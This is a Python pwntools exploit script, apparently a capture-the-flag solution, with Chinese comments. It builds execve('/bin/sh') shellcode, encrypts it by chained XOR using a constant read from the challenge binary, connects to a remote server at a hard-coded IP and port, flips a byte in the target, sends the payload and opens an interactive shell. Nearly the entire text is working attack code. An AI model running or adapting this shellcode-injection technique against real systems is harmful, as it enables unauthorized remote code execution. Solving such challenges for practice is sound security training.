#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# 1. 從本地的 chall 檔案讀取加密需要的常數 C[46] (位址 0x105)
with open('./chall_084b3455f35b2d205834ec063f7de208', 'rb') as f:
    f.seek(0x105)
    c46 = f.read(1)[0]

# 2. 準備極短版 execve("/bin/sh") Shellcode (22 bytes)
sc = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    push 59
    pop rax
    syscall
''')

# 3. 構造 46 bytes 的明文 Payload (Plaintext)
# 結構：[Shellcode] + [NOP填充] + [jmp 0x4000d7] + [NOP填充]
P = bytearray(sc)
P += b'\x90' * (39 - len(P))  # 填充到第 39 byte
P += b'\xeb\xd7'              # 這是 jmp 0x4000d7 (放在 0x4000fe 的位置)
P += b'\x90' * (46 - len(P))  # 填滿 46 bytes

# 4. 逆向推導密文 Payload (Ciphertext)
C = bytearray(46)
next_c = c46
for i in range(45, -1, -1):
    C[i] = P[i] ^ next_c
    next_c = C[i]

# 5. 連線至伺服器
print("[*] Connecting to server...")
p = remote('140.117.80.61', 4444)

# 6. 觸發 Byte Flip (翻轉偏移量 0x49 變成 0x41)
# 0x49 位在檔案的 0xbc 處。翻轉第 3 個 bit。
p.sendlineafter(b"(0x80-0x139): ", b"bc")
p.sendlineafter(b"(7-0): ", b"3")

# 7. 等待程式啟動並發送惡意 Ciphertext
print("[*] Sending encrypted payload...")
p.send(C)

# 8. 奪取 Shell！
print("[*] Boom! You should have a shell now.")
p.interactive()